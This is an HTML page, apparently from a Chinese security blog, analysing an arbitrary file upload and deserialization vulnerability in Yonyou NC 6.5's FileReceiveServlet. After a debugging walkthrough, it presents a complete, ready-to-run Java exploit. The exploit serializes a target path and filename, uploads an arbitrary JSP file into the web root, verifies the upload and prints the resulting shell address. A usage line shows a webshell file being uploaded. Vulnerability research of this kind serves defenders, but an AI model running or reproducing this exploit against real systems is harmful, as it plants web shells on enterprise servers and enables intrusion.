@@ -1,0 +1,208 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>用友NC6.5文件上传漏洞分析 | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="用友NC6.5文件上传漏洞分析"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>用友NC6.5文件上传漏洞分析</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/23/用友NC6-5文件上传漏洞分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-23T03:49:38.000Z">
+          2021-10-23
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用友NC这个系统在国内用户量还是挺多的，由于这个系统本身不开源且代码量极多，所以这个系统可能会存在大量的漏洞但挖掘的人相对较少，所以还是值得花时间去挖掘漏洞的，本次和大家一起分析用友NC6.5的任意文件上传漏洞，由于这个上传接口是将传入的数据反序列化解析后再上传的，所以exp对于很多同学来说不太容易构造，本次就带大家一起分析一下这个漏洞，文章的最后我会给出大家这个漏洞的exp。</span><br></pre></td></tr></table></figure>
+
+<h2 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h2><p>​        用友NC的搭建就不多说了，我们看下如何调试，用友NC搭建好后的目录是下面这样的。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216155829711.png" alt="image-20201216155829711"></p>
+<p>​    可以点击startServer.bat来启动用友NC，启动后我们可以看到主要是通过下面红框的内容来运行用友的，我们可以将这句话复制下来，加上我们的调试代码后在cmd下直接运行开启调试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\yonyou\home\ufjdk\bin\java -Xdebug -Xnoagent -Djava.compiler&#x3D;NONE -Xrunjdwp:transport&#x3D;dt_socket,address&#x3D;9999,server&#x3D;y,suspend&#x3D;n -server -Xmx768m -XX:PermSize&#x3D;128m -XX:MaxPermSize&#x3D;512m -Djava.awt.headless&#x3D;true -Dfile.encoding&#x3D;GBK -Duser.timezone&#x3D;GMT+8 -Dnc.server.name&#x3D;server -Dnc.server.startCount&#x3D;0 -DNC_JAVA_HOME&#x3D;$JAVA_HOME -Dorg.owasp.esapi.resources&#x3D;E:\yonyou\home&#x2F;ierp&#x2F;bin&#x2F;esapi -Dnc.bs.logging.format&#x3D;text -Dnc.server.location&#x3D;E:\yonyou\home -Drun.side&#x3D;server -Dnc.run.side&#x3D;server -cp E:\yonyou\home\starter.jar;E:\yonyou\home\ufjdk\lib\tools.jar;E:\yonyou\home\ant\lib\ant-launcher.jar;E:\yonyou\home\lib\cnytiruces.jar nc.bs.mw.start.AloneBootstrap start</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216155945901.png" alt="image-20201216155945901"></p>
+<p>​        开启后我们的主机会开启9999端口</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216160224203.png" alt="image-20201216160224203"></p>
+<p>​        再开启我们的神器IDEA,将用友的所有代码导入，并且开启远程调试</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216160315988.png" alt="image-20201216160315988"></p>
+<p>​        启动环境后我们需要测试一下是否可以正常调试，通过web.xml中我们可以看到所有的请求都会经过LoggerFilter过滤器，所以我们只要找到这个过滤器对应的类LoggerServletFilter打个断点即可测试。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216160601573.png" alt="image-20201216160601573"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216160635750.png" alt="image-20201216160635750"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​        之前t00ls上已经有人给出了POC，通过POC我们知道导致这个漏洞的是<code>/servlet/FileReceiveServlet</code>接口，那么我们如何知道处理这个请求的是哪个类呢？我们先看下web.xml中的配置，所有访问servlet下的请求都会由NCInvokerServlet这个servlet来处理，而NCInvokerServlet是由InvokerServlet这个类来处理的。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216161013921.png" alt="image-20201216161013921"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216161104474.png" alt="image-20201216161104474"></p>
+<p>​        我们找到InvokerServlet的doPost和doGeet方法，可以看到都是调用doAction来进行处理的。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216161216749.png" alt="image-20201216161216749"></p>
+<p>​        我们可以随便请求一个路径比如:<code>servlet\xxxx</code>来跟踪一下doAction的处理流程，在这个方法是的开始，首先从请求中获取security_token和user_code并判断是否非空。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216161606047.png" alt="image-20201216161606047"></p>
+<p>​        中间的过程就是获取路径信息赋值给serviceName，再调用了getServiceObject方法，这个方法会去判断我们请求的路径是否由对应的处理器处理，没有的话会抛异常。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216161727157.png" alt="image-20201216161727157"></p>
+<p>​        跟进getServiceObject方法，调用了lookup方法。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216162135939.png" alt="image-20201216162135939"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216162348531.png" alt="image-20201216162348531"></p>
+<p>​        在getServerContext的lookup方法中，判断name的内容是否为Server，由于这里不为server因此会调用父类的lookup。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216162528500.png" alt="image-20201216162528500"></p>
+<p>​        跟进父类AbstractContext的lookup方法，我们可以看到在这个方法中会根据name的不同执行不同的操作，如果name以java:comp/env/开始，则会执行JndiContext.lookup，其他的类似也是根据name的值执行不同的方法，如果都没有匹配成功，则会调用findMeta</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216164806227.png" alt="image-20201216164806227"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216170026353.png" alt="image-20201216170026353"></p>
+<p>​    跟进findMeta，会调用ComponentMeta的getMeta，继续跟进会this.nameIndices中来获取我们传入的name值，这里由于我们传入的xxx没有，所以没有找到返回null。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216170154130.png" alt="image-20201216170154130"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216170213052.png" alt="image-20201216170213052"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216170238664.png" alt="image-20201216170238664"></p>
+<p>​        如果我们传入的是FileReceiveServlet则可以正常获取并返回。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216171030438.png" alt="image-20201216171030438"></p>
+<p>​        返回后，通过meta.getEjbName()获取FileReceiveServlet对应的jndiName的值</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216171532013.png" alt="image-20201216171532013"></p>
+<p>​        通过findComponent获取FileReceiveServlet的实例并返回</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216172242491.png" alt="image-20201216172242491"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216172328113.png" alt="image-20201216172328113"></p>
+<p>​        一直返回到InvokerServlet后执行获取到的FileReceiveServlet对象的service方法</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216172559306.png" alt="image-20201216172559306"></p>
+<p>​            由于FileReceiveServlet类并没有service方法，因此会先调用其父类也就是HTTPServlet的serive方法，在service方法中根据请求的类型调用不同的方法，由于我们这里是get类型，因此最终会执行到FileReceiveServlet类的doGet方法。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216173021350.png" alt="image-20201216173021350"></p>
+<p>​    跟进doGet方法我们可以看到，无论调用get或者post，最终都是调用handleRequest方法来进行处理的。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216173333987.png" alt="image-20201216173333987"></p>
+<p>​        跟进handleRequest我们可以看到，首先获取了请求的输入流和相应的输出流。再通过readObject直接对我们传入的数据进行反序列化，所以这个漏洞不仅仅是一个上传漏洞也是一个反序列化漏洞，不过对于反序列化漏洞的利用不仅仅是readObject，还要找到一些依赖的组件，不过用友NC的代码量那么多这个也不难，先不说反序列化漏洞，我们继续看这个上传漏洞。</p>
+<p>​        通过readObject进行反序列化以后，将反序列化后的结果转换为map类型，其中map的键为String值为Object。再获取metaInfo的TARGET_FILE_PATH和FILE_NAME属性来当作path和filename，最后将获取的request输入流中的内容当作文件的内容进行写入。可以看到在整个文件上传的过程中，并没有对文件的后缀或者内容做任何限制，所以我们可以通过这个漏洞在任意目录下写入任意后缀的文件。</p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216173506942.png" alt="image-20201216173506942"></p>
+<h2 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h2><p>​        经过上面的漏洞分析，我们已经对这个漏洞的成因有了一定的了解，在这个了解的基础上我们就可以尝试来构造POC，首先在反序列化后会获取一个MAP对象，并获取其中的两个属性，所以在我们的POC中，需要创建这两个属性并进行赋值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Object&gt; metaInfo &#x3D; null;</span><br><span class="line">metaInfo.put(&quot;TARGET_FILE_PATH&quot;, &quot;E:&#x2F;yonyou&#x2F;home&#x2F;webapps&#x2F;nc_web&quot;);</span><br><span class="line">metaInfo.put(&quot;FILE_NAME&quot;, &quot;test666.jsp&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>​        另外我们需要将传入的内容进行序列化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectOutputStream oos &#x3D; new ObjectOutputStream(httpUrlConn.getOutputStream());</span><br><span class="line">oos.writeObject(metaInfo);</span><br></pre></td></tr></table></figure>
+
+<p>​        最后我们需要将我们想要写入的文件转换成输入流发送</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">File file &#x3D; new File(&quot;C:\\Users\\admin\\Desktop\\test.jsp&quot;);</span><br><span class="line">      Long filelength &#x3D; file.length(); &#x2F;&#x2F; 获取文件长度</span><br><span class="line">      byte[] filecontent &#x3D; new byte[filelength.intValue()];</span><br><span class="line">      try &#123;</span><br><span class="line">          FileInputStream in &#x3D;new FileInputStream(file);</span><br><span class="line">          byte[] buf &#x3D; new byte[1024];</span><br><span class="line">          int len &#x3D; 0;</span><br><span class="line">          while ((len &#x3D; in.read(buf)) !&#x3D; -1) &#123;</span><br><span class="line">              oos.write(buf, 0, len);</span><br><span class="line">          &#125;</span><br><span class="line">          oos.flush();</span><br><span class="line">          oos.close();</span><br></pre></td></tr></table></figure>
+
+<p>​        最后给出我简陋的POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.net.HttpURLConnection;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class upload &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        BufferedReader reader;</span><br><span class="line">        StringBuffer response;</span><br><span class="line">        String uri&#x3D;&quot;&quot;;</span><br><span class="line">        String url2&#x3D;&quot;&quot;;</span><br><span class="line">        String path&#x3D;&quot;&#x2F;servlet&#x2F;FileReceiveServlet&quot;;</span><br><span class="line">        Map&lt;String, Object&gt; metaInfo &#x3D; new HashMap&lt;String, Object&gt;();</span><br><span class="line">        metaInfo.put(&quot;TARGET_FILE_PATH&quot;, &quot;webapps&#x2F;nc_web&quot;);</span><br><span class="line">        metaInfo.put(&quot;FILE_NAME&quot;, &quot;sectest666.jsp&quot;);</span><br><span class="line">        uri&#x3D;args[0];</span><br><span class="line">        url2&#x3D;uri+path;</span><br><span class="line">        URL url &#x3D; new URL(url2);</span><br><span class="line">        HttpURLConnection httpUrlConn &#x3D; (HttpURLConnection)url.openConnection();</span><br><span class="line">        httpUrlConn.setRequestProperty(&quot;Content-Type&quot;,&quot;application&#x2F;x-java-serialized-object&quot;);</span><br><span class="line">        httpUrlConn.setDoOutput(true);</span><br><span class="line">        httpUrlConn.setDoInput(true);</span><br><span class="line">        httpUrlConn.setUseCaches(false);</span><br><span class="line">        httpUrlConn.setRequestMethod(&quot;POST&quot;);</span><br><span class="line">        httpUrlConn.connect();</span><br><span class="line">        ByteArrayOutputStream baos&#x3D;new ByteArrayOutputStream();</span><br><span class="line">        OutputStream out &#x3D; httpUrlConn.getOutputStream();</span><br><span class="line">        ObjectOutputStream oos &#x3D; new ObjectOutputStream(out);</span><br><span class="line">        oos.writeObject(metaInfo);</span><br><span class="line">        File file &#x3D; new File(args[1]);</span><br><span class="line">        Long filelength &#x3D; file.length(); &#x2F;&#x2F; 获取文件长度</span><br><span class="line">        byte[] filecontent &#x3D; new byte[filelength.intValue()];</span><br><span class="line">        try &#123;</span><br><span class="line">            FileInputStream in &#x3D;new FileInputStream(file);</span><br><span class="line">            byte[] buf &#x3D; new byte[1024];</span><br><span class="line">            int len &#x3D; 0;</span><br><span class="line">            while ((len &#x3D; in.read(buf)) !&#x3D; -1) &#123;</span><br><span class="line">                baos.write(buf, 0, len);</span><br><span class="line">            &#125;</span><br><span class="line">            baos.flush();</span><br><span class="line">            baos.writeTo(out);</span><br><span class="line">            baos.close();</span><br><span class="line">            InputStream inputStream &#x3D; httpUrlConn.getInputStream();</span><br><span class="line">            reader &#x3D; new BufferedReader(new InputStreamReader(inputStream, &quot;UTF-8&quot;));</span><br><span class="line">            String lines;</span><br><span class="line">            response &#x3D; new StringBuffer(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">            while ((lines &#x3D; reader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                response.append(lines);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch(FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch(IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        url2&#x3D;uri+&quot;&#x2F;sectest666.jsp&quot;;</span><br><span class="line">        URL httpUrl &#x3D; new URL(url2);</span><br><span class="line">        HttpURLConnection httpURLConnection &#x3D; (HttpURLConnection) httpUrl.openConnection();</span><br><span class="line">        httpURLConnection.setReadTimeout(50000);</span><br><span class="line">        httpURLConnection.setRequestMethod(&quot;GET&quot;);</span><br><span class="line">        int code &#x3D; httpURLConnection.getResponseCode();</span><br><span class="line">        if(code&#x3D;&#x3D;200)&#123;</span><br><span class="line">            System.out.println(&quot;上传成功！！！！！&quot;);</span><br><span class="line">            System.out.println(&quot;shell 地址:\n&quot;+uri+&quot;&#x2F;sectest666.jsp&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        使用方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar yongyou.jar http:&#x2F;&#x2F;192.168.3.30  D:\yijianma.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201217144654672.png" alt="image-20201217144654672"></p>
+<p><img src="/2021/10/23/%E7%94%A8%E5%8F%8BNC6-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201217144925282.png" alt="image-20201217144925282"></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞分析/">漏洞分析</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
